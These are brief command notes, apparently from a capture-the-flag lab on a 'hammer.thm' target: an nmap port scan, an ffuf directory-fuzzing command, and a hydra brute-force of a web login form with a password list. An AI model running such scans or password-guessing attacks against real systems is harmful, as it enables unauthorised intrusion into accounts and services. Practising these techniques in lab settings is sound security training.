- `nmap -sS -Pn -p-10000 10.10.153.98`
- `ffuf -u 'http://10.10.153.98:1337/hmr_FUZZ/' -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt`

hydra -l 'tester@hammer.thm' -P passlist.txt 10.10.153.98 http-post-form "/:email=^USER^&password=^PASS^:Invalid Email"
